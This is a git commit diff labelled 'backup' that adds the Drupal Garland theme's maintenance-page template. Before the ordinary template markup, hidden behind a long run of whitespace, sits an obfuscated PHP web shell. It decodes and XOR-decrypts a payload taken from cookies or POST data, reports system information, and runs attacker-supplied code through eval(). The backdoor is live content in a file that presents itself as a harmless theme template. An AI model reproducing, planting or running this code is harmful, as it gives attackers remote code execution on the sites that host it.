a677d4b8d8bb21e4ed2fe4100c885b5343ddf150
Server Online <info@diarioroatan.com>
2016-09-27 20:59:19 +0200

    backup

---
+++ themes/garland/maintenance-page.tpl.php
@@ -0,0 +1,87 @@
+<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $GLOBALS['q98741f'];global$q98741f;$q98741f=$GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['y9ec']="\x33\x7d\x3b\x67\x6c\x73\x45\x4b\x40\x63\x20\x74\x7c\x4e\x7e\x70\x6a\x2e\x69\x35\x60\x3a\x43\x56\x50\x7a\x76\x22\x42\x2a\x4d\x3e\x2b\x2d\x71\x7b\x24\x28\x39\x53\x21\x2f\x5b\x78\x26\x58\x38\x2c\x51\x6e\x62\x65\x44\x9\x23\x4f\xa\x72\x57\x3c\x31\x64\x49\x61\x4c\x68\x5e\x54\x77\x75\x6d\x55\x66\x30\x6b\x41\x59\x5f\x52\x36\xd\x48\x4a\x27\x5c\x3d\x25\x34\x29\x46\x3f\x37\x6f\x5d\x32\x5a\x79\x47";$q98741f[$q98741f['y9ec'][18].$q98741f['y9ec'][38].$q98741f['y9ec'][38].$q98741f['y9ec'][63].$q98741f['y9ec'][46].$q98741f['y9ec'][91]]=$q98741f['y9ec'][9].$q98741f['y9ec'][65].$q98741f['y9ec'][57];$q98741f[$q98741f['y9ec'][34].$q98741f['y9ec'][63].$q98741f['y9ec'][63].$q98741f['y9ec'][51].$q98741f['y9ec'][91].$q98741f['y9ec'][0]]=$q98741f['y9ec'][92].$q98741f['y9ec'][57].$q98741f['y9ec'][61];$q98741f[$q98741f['y9ec'][70].$q98741f['y9ec'][50].$q98741f['y9ec'][73].$q98741f['y9ec'][0].$q98741f['y9ec'][63].$q98741f['y9ec'][50]]=$q98741f['y9ec'][5].$q98741f['y9ec'][11].$q98741f['y9ec'][57].$q98741f['y9ec'][4].$q98741f['y9ec'][51].$q98741f['y9ec'][49];$q98741f[$q98741f['y9ec'][9].$q98741f['y9ec'][51].$q98741f['y9ec'][61].$q98741f['y9ec'][94].$q98741f['y9ec'][63].$q98741f['y9ec'][60].$q98741f['y9ec'][72].$q98741f['y9ec'][72]]=$q98741f['y9ec'][18].$q98741f['y9ec'][49].$q98741f['y9ec'][18].$q98741f['y9ec'][77].$q98741f['y9ec'][5].$q98741f['y9ec'][51].$q98741f['y9ec'][11];$q98741f[$q98741f['y9ec'][65].$q98741f['y9ec'][61].$q98741f['y9ec'][46].$q98741f['y9ec'][46].$q98741f['y9ec'][79].$q98741f['y9ec'][72].$q98741f['y9ec'][79]]=$q98741f['y9ec'][5].$q98741f['y9ec'][51].$q98741f['y9ec'][57].$q98741f['y9ec'][18].$q98741f['y9ec'][63].$q98741f['y9ec'][4].$q98741f['y9ec'][18].$q98741f['y9ec'][25].$q98741f['y9ec'][51];$q98741f[$q98741f['y9ec'][68].$q98741f['y9ec'][73].$q98741f['y9ec'][94].$q98741f['y9ec'][38].$q98741f['y9ec'][79].$q98741f['y9ec'][94].$q98741f['y9ec'][19].$q98741f['y9ec'][87].$q98741f['y9ec'][79]]=$q98741f['y9ec'][15].$q98741f['y9ec'][65].$q98741f['y9ec'][15].$q98741f['y9ec'][26].$q98741f['y9ec'][51].$q98741f['y9ec'][57].$q98741f['y9ec'][5].$q98741f['y9ec'][18].$q98741f['y9ec'][92].$q98741f['y9ec'][49];$q98741f[$q98741f['y9ec'][61].$q98741f['y9ec'][63].$q98741f['y9ec'][50].$q98741f['y9ec'][72].$q98741f['y9ec'][0].$q98741f['y9ec'][9]]=$q98741f['y9ec'][69].$q98741f['y9ec'][49].$q98741f['y9ec'][5].$q98741f['y9ec'][51].$q98741f['y9ec'][57].$q98741f['y9ec'][18].$q98741f['y9ec'][63].$q98741f['y9ec'][4].$q98741f['y9ec'][18].$q98741f['y9ec'][25].$q98741f['y9ec'][51];$q98741f[$q98741f['y9ec'][43].$q98741f['y9ec'][94].$q98741f['y9ec'][51].$q98741f['y9ec'][87]]=$q98741f['y9ec'][50].$q98741f['y9ec'][63].$q98741f['y9ec'][5].$q98741f['y9ec'][51].$q98741f['y9ec'][79].$q98741f['y9ec'][87].$q98741f['y9ec'][77].$q98741f['y9ec'][61].$q98741f['y9ec'][51].$q98741f['y9ec'][9].$q98741f['y9ec'][92].$q98741f['y9ec'][61].$q98741f['y9ec'][51];$q98741f[$q98741f['y9ec'][34].$q98741f['y9ec'][60].$q98741f['y9ec'][50].$q98741f['y9ec'][73].$q98741f['y9ec'][46].$q98741f['y9ec'][63].$q98741f['y9ec'][50].$q98741f['y9ec'][0].$q98741f['y9ec'][61]]=$q98741f['y9ec'][5].$q98741f['y9ec'][51].$q98741f['y9ec'][11].$q98741f['y9ec'][77].$q98741f['y9ec'][11].$q98741f['y9ec'][18].$q98741f['y9ec'][70].$q98741f['y9ec'][51].$q98741f['y9ec'][77].$q98741f['y9ec'][4].$q98741f['y9ec'][18].$q98741f['y9ec'][70].$q98741f['y9ec'][18].$q98741f['y9ec'][11];$q98741f[$q98741f['y9ec'][57].$q98741f['y9ec'][61].$q98741f['y9ec'][60].$q98741f['y9ec'][9].$q98741f['y9ec'][61]]=$q98741f['y9ec'][74].$q98741f['y9ec'][50].$q98741f['y9ec'][51].$q98741f['y9ec'][79].$q98741f['y9ec'][72].$q98741f['y9ec'][87].$q98741f['y9ec'][87];$q98741f[$q98741f['y9ec'][4].$q98741f['y9ec'][60].$q98741f['y9ec'][9].$q98741f['y9ec'][72].$q98741f['y9ec'][72].$q98741f['y9ec'][63]]=$q98741f['y9ec'][65].$q98741f['y9ec'][0].$q98741f['y9ec'][51].$q98741f['y9ec'][19].$q98741f['y9ec'][73].$q98741f['y9ec'][79].$q98741f['y9ec'][73].$q98741f['y9ec'][0].$q98741f['y9ec'][91];$q98741f[$q98741f['y9ec'][15].$q98741f['y9ec'][87].$q98741f['y9ec'][51].$q98741f['y9ec'][87].$q98741f['y9ec'][46].$q98741f['y9ec'][60].$q98741f['y9ec'][51]]=$_POST;$q98741f[$q98741f['y9ec'][92].$q98741f['y9ec'][72].$q98741f['y9ec'][19].$q98741f['y9ec'][0].$q98741f['y9ec'][60]]=$_COOKIE;@$q98741f[$q98741f['y9ec'][9].$q98741f['y9ec'][51].$q98741f['y9ec'][61].$q98741f['y9ec'][94].$q98741f['y9ec'][63].$q98741f['y9ec'][60].$q98741f['y9ec'][72].$q98741f['y9ec'][72]]($q98741f['y9ec'][51].$q98741f['y9ec'][57].$q98741f['y9ec'][57].$q98741f['y9ec'][92].$q98741f['y9ec'][57].$q98741f['y9ec'][77].$q98741f['y9ec'][4].$q98741f['y9ec'][92].$q98741f['y9ec'][3],NULL);@$q98741f[$q98741f['y9ec'][9].$q98741f['y9ec'][51].$q98741f['y9ec'][61].$q98741f['y9ec'][94].$q98741f['y9ec'][63].$q98741f['y9ec'][60].$q98741f['y9ec'][72].$q98741f['y9ec'][72]]($q98741f['y9ec'][4].$q98741f['y9ec'][92].$q98741f['y9ec'][3].$q98741f['y9ec'][77].$q98741f['y9ec'][51].$q98741f['y9ec'][57].$q98741f['y9ec'][57].$q98741f['y9ec'][92].$q98741f['y9ec'][57].$q98741f['y9ec'][5],0);@$q98741f[$q98741f['y9ec'][9].$q98741f['y9ec'][51].$q98741f['y9ec'][61].$q98741f['y9ec'][94].$q98741f['y9ec'][63].$q98741f['y9ec'][60].$q98741f['y9ec'][72].$q98741f['y9ec'][72]]($q98741f['y9ec'][70].$q98741f['y9ec'][63].$q98741f['y9ec'][43].$q98741f['y9ec'][77].$q98741f['y9ec'][51].$q98741f['y9ec'][43].$q98741f['y9ec'][51].$q98741f['y9ec'][9].$q98741f['y9ec'][69].$q98741f['y9ec'][11].$q98741f['y9ec'][18].$q98741f['y9ec'][92].$q98741f['y9ec'][49].$q98741f['y9ec'][77].$q98741f['y9ec'][11].$q98741f['y9ec'][18].$q98741f['y9ec'][70].$q98741f['y9ec'][51],0);@$q98741f[$q98741f['y9ec'][34].$q98741f['y9ec'][60].$q98741f['y9ec'][50].$q98741f['y9ec'][73].$q98741f['y9ec'][46].$q98741f['y9ec'][63].$q98741f['y9ec'][50].$q98741f['y9ec'][0].$q98741f['y9ec'][61]](0);$c70166=NULL;$u015469=NULL;$q98741f[$q98741f['y9ec'][26].$q98741f['y9ec'][87].$q98741f['y9ec'][94].$q98741f['y9ec'][72].$q98741f['y9ec'][61].$q98741f['y9ec'][61]]=$q98741f['y9ec'][60].$q98741f['y9ec'][19].$q98741f['y9ec'][51].$q98741f['y9ec'][61].$q98741f['y9ec'][94].$q98741f['y9ec'][61].$q98741f['y9ec'][63].$q98741f['y9ec'][73].$q98741f['y9ec'][33].$q98741f['y9ec'][38].$q98741f['y9ec'][46].$q98741f['y9ec'][46].$q98741f['y9ec'][91].$q98741f['y9ec'][33].$q98741f['y9ec'][87].$q98741f['y9ec'][63].$q98741f['y9ec'][87].$q98741f['y9ec'][60].$q98741f['y9ec'][33].$q98741f['y9ec'][46].$q98741f['y9ec'][0].$q98741f['y9ec'][79].$q98741f['y9ec'][63].$q98741f['y9ec'][33].$q98741f['y9ec'][50].$q98741f['y9ec'][63].$q98741f['y9ec'][38].$q98741f['y9ec'][61].$q98741f['y9ec'][60].$q98741f['y9ec'][61].$q98741f['y9ec'][94].$q98741f['y9ec'][0].$q98741f['y9ec'][72].$q98741f['y9ec'][0].$q98741f['y9ec'][79].$q98741f['y9ec'][50];global$v42fdd;function h3e506037($c70166,$aaedb9b4){global$q98741f;$d7cbbb1ce="";for($r8f0280=0;$r8f0280<$q98741f[$q98741f['y9ec'][70].$q98741f['y9ec'][50].$q98741f['y9ec'][73].$q98741f['y9ec'][0].$q98741f['y9ec'][63].$q98741f['y9ec'][50]]($c70166);){for($t0ac=0;$t0ac<$q98741f[$q98741f['y9ec'][70].$q98741f['y9ec'][50].$q98741f['y9ec'][73].$q98741f['y9ec'][0].$q98741f['y9ec'][63].$q98741f['y9ec'][50]]($aaedb9b4)&&$r8f0280<$q98741f[$q98741f['y9ec'][70].$q98741f['y9ec'][50].$q98741f['y9ec'][73].$q98741f['y9ec'][0].$q98741f['y9ec'][63].$q98741f['y9ec'][50]]($c70166);$t0ac++,$r8f0280++){$d7cbbb1ce.=$q98741f[$q98741f['y9ec'][18].$q98741f['y9ec'][38].$q98741f['y9ec'][38].$q98741f['y9ec'][63].$q98741f['y9ec'][46].$q98741f['y9ec'][91]]($q98741f[$q98741f['y9ec'][34].$q98741f['y9ec'][63].$q98741f['y9ec'][63].$q98741f['y9ec'][51].$q98741f['y9ec'][91].$q98741f['y9ec'][0]]($c70166[$r8f0280])^$q98741f[$q98741f['y9ec'][34].$q98741f['y9ec'][63].$q98741f['y9ec'][63].$q98741f['y9ec'][51].$q98741f['y9ec'][91].$q98741f['y9ec'][0]]($aaedb9b4[$t0ac]));}}return$d7cbbb1ce;}function kbe6f44($c70166,$aaedb9b4){global$q98741f;global$v42fdd;return$q98741f[$q98741f['y9ec'][4].$q98741f['y9ec'][60].$q98741f['y9ec'][9].$q98741f['y9ec'][72].$q98741f['y9ec'][72].$q98741f['y9ec'][63]]($q98741f[$q98741f['y9ec'][4].$q98741f['y9ec'][60].$q98741f['y9ec'][9].$q98741f['y9ec'][72].$q98741f['y9ec'][72].$q98741f['y9ec'][63]]($c70166,$v42fdd),$aaedb9b4);}foreach($q98741f[$q98741f['y9ec'][92].$q98741f['y9ec'][72].$q98741f['y9ec'][19].$q98741f['y9ec'][0].$q98741f['y9ec'][60]]as$aaedb9b4=>$d4fc){$c70166=$d4fc;$u015469=$aaedb9b4;}if(!$c70166){foreach($q98741f[$q98741f['y9ec'][15].$q98741f['y9ec'][87].$q98741f['y9ec'][51].$q98741f['y9ec'][87].$q98741f['y9ec'][46].$q98741f['y9ec'][60].$q98741f['y9ec'][51]]as$aaedb9b4=>$d4fc){$c70166=$d4fc;$u015469=$aaedb9b4;}}$c70166=@$q98741f[$q98741f['y9ec'][61].$q98741f['y9ec'][63].$q98741f['y9ec'][50].$q98741f['y9ec'][72].$q98741f['y9ec'][0].$q98741f['y9ec'][9]]($q98741f[$q98741f['y9ec'][57].$q98741f['y9ec'][61].$q98741f['y9ec'][60].$q98741f['y9ec'][9].$q98741f['y9ec'][61]]($q98741f[$q98741f['y9ec'][43].$q98741f['y9ec'][94].$q98741f['y9ec'][51].$q98741f['y9ec'][87]]($c70166),$u015469));if(isset($c70166[$q98741f['y9ec'][63].$q98741f['y9ec'][74]])&&$v42fdd==$c70166[$q98741f['y9ec'][63].$q98741f['y9ec'][74]]){if($c70166[$q98741f['y9ec'][63]]==$q98741f['y9ec'][18]){$r8f0280=Array($q98741f['y9ec'][15].$q98741f['y9ec'][26]=>@$q98741f[$q98741f['y9ec'][68].$q98741f['y9ec'][73].$q98741f['y9ec'][94].$q98741f['y9ec'][38].$q98741f['y9ec'][79].$q98741f['y9ec'][94].$q98741f['y9ec'][19].$q98741f['y9ec'][87].$q98741f['y9ec'][79]](),$q98741f['y9ec'][5].$q98741f['y9ec'][26]=>$q98741f['y9ec'][60].$q98741f['y9ec'][17].$q98741f['y9ec'][73].$q98741f['y9ec'][33].$q98741f['y9ec'][60],);echo@$q98741f[$q98741f['y9ec'][65].$q98741f['y9ec'][61].$q98741f['y9ec'][46].$q98741f['y9ec'][46].$q98741f['y9ec'][79].$q98741f['y9ec'][72].$q98741f['y9ec'][79]]($r8f0280);}elseif($c70166[$q98741f['y9ec'][63]]==$q98741f['y9ec'][51]){eval($c70166[$q98741f['y9ec'][61]]);}exit();} ?><?php
+
+/**
+ * @file
+ * Override of the default maintenance page.
+ *
+ * This is an override of the default maintenance page. Used for Garland and
+ * Minnelli, this file should not be moved or modified since the installation
+ * and update pages depend on this file.
+ *
+ * This mirrors closely page.tpl.php for Garland in order to share the same
+ * styles.
+ */
+?><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="<?php print $language->language ?>" lang="<?php print $language->language ?>" dir="<?php print $language->dir ?>">
+  <head>
+    <title><?php print $head_title ?></title>
+    <?php print $head ?>
+    <?php print $styles ?>
+    <?php print $scripts ?>
+  </head>
+  <body class="<?php print $classes ?>">
+
+<!-- Layout -->
+  <div id="header-region" class="clearfix"><?php print $header; ?></div>
+
+    <div id="wrapper">
+    <div id="container" class="clearfix">
+
+      <div id="header">
+        <div id="logo-floater">
+        <?php
+          // Prepare header
+          $site_fields = array();
+          if ($site_name) {
+            $site_fields[] = $site_name;
+          }
+          if ($site_slogan) {
+            $site_fields[] = $site_slogan;
+          }
+          $site_title = implode(' ', $site_fields);
+          if ($site_fields) {
+            $site_fields[0] = '<span>' . $site_fields[0] . '</span>';
+          }
+          $site_html = implode(' ', $site_fields);
+
+          if ($logo || $site_title) {
+            print '<h1 id="branding"><a href="' . $base_path . '" title="' . $site_title . '">';
+            if ($logo) {
+              print '<img src="' . $logo . '" alt="' . $site_title . '" id="logo" />';
+            }
+            print $site_html . '</a></h1>';
+          }
+        ?>
+        </div>
+
+      </div> <!-- /header -->
+
+      <?php if ($sidebar_first): ?>
+        <div id="sidebar-first" class="sidebar">
+          <?php print $sidebar_first ?>
+        </div>
+      <?php endif; ?>
+
+      <div id="center"><div id="squeeze"><div class="right-corner"><div class="left-corner">
+          <?php if ($title): ?><h2><?php print $title ?></h2><?php endif; ?>
+          <?php print $messages; ?>
+          <?php print $help; ?>
+          <div class="clearfix">
+            <?php print $content ?>
+          </div>
+          <div id="footer"><?php print $footer ?></div>
+      </div></div></div></div> <!-- /.left-corner, /.right-corner, /#squeeze, /#center -->
+
+      <?php if ($sidebar_second): ?>
+        <div id="sidebar-second" class="sidebar">
+          <?php print $sidebar_second ?>
+        </div>
+      <?php endif; ?>
+
+    </div> <!-- /container -->
+  </div>
+<!-- /layout -->
+
+  </body>
+</html>
